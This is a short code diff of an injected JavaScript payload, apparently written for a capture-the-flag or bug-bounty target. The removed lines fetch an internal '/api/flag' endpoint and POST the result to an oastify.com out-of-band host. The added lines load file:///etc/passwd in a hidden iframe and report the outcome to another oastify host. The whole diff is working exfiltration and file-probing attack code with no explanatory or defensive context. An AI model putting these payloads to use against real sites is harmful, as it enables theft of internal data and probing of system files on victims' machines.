@@ -1,24 +1,20 @@
 <script>
-  async function fetchFlag() {
-    try {
-      // Attempt to fetch internal endpoints
-      const response = await fetch('/api/flag');
-      const data = await response.text();
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = 'file:///etc/passwd'; // Replace with the target file path
+  document.body.appendChild(iframe);
 
-      // Send the response to your server
-      fetch('https://tvszdx5dhy4imqa0ioubcq0h086zuyin.oastify.com', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ flag: data })
-      });
-    } catch (e) {
-      // Send error message if the request fails
-      fetch('https://tvszdx5dhy4imqa0ioubcq0h086zuyin.oastify.com', {
-        method: 'POST',
-        body: JSON.stringify({ error: e.message })
-      });
-    }
-  }
+  iframe.onload = () => {
+    fetch('https://vkj12zuf60tkbsz27qjd1spjpav1j17q.oastify.com', {
+      method: 'POST',
+      body: 'File exists: file:///etc/passwd'
+    });
+  };
 
-  fetchFlag();
+  iframe.onerror = () => {
+    fetch('https://vkj12zuf60tkbsz27qjd1spjpav1j17q.oastify.com', {
+      method: 'POST',
+      body: 'Error: Could not load file:///etc/passwd'
+    });
+  };
 </script>
